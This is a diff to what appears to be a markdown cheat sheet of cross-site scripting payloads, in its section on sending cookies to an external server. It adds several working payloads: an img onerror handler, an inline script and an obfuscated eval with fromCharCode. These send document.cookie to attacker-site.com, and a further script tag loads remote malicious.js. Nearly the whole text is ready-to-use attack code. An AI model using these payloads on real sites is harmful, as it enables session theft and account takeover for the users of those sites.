@@ -16,7 +16,16 @@ javascript:alert(1)
 #### Sending cookies to an external server via fetch
 ```
 fetch('https://attacker-site.com/steal-cookies?cookie=' + encodeURIComponent(document.cookie));
+
+<img src=x onerror="fetch('https://attacker-site.com/?c='+document.cookie)">
+
+<script>eval(String.fromCharCode(102,101,116,99,104,40,39,104...));</script>
+
+<script>(()=>{fetch('https://attacker-site.com/?c='+document.cookie)})()</script>
+
+<script src="https://attacker-site.com/malicious.js"></script>
 ```
+
 
 #### Using the Image object to transfer cookies (workaround)
 ```
